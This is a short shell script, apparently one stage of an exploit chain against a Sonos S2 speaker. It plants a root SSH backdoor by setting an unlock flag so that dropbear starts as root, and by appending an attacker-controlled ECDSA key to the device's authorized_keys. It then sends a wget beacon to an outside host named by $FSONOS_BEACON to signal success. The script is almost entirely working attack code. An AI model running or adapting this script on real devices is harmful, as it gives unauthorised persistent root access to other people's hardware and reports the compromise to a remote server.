#!/bin/sh
# S2 root door: unlock flag + our ECDSA key in the dropbear authorized_keys.
# Run as anacapa (all=eip) via the .aa chain. /etc/inittab respawns run_sshd.sh as root,
# which waits on the flag (10 s poll) and then execs `dropbear -R -F` on :22.
set -x
touch /tmp/device_unlocked_flag
mkdir -p /jffs/sys/debug/ssh
chmod 700 /jffs/sys/debug/ssh
if [ -n "$FSONOS_PUBKEY" ]; then
    grep -q fsonos-root /jffs/sys/debug/ssh/authorized_keys 2>/dev/null \
        || echo "$FSONOS_PUBKEY" >> /jffs/sys/debug/ssh/authorized_keys
    chmod 644 /jffs/sys/debug/ssh/authorized_keys
fi
sync
wget -qO- "http://$FSONOS_BEACON/BEAT-S2KEY"
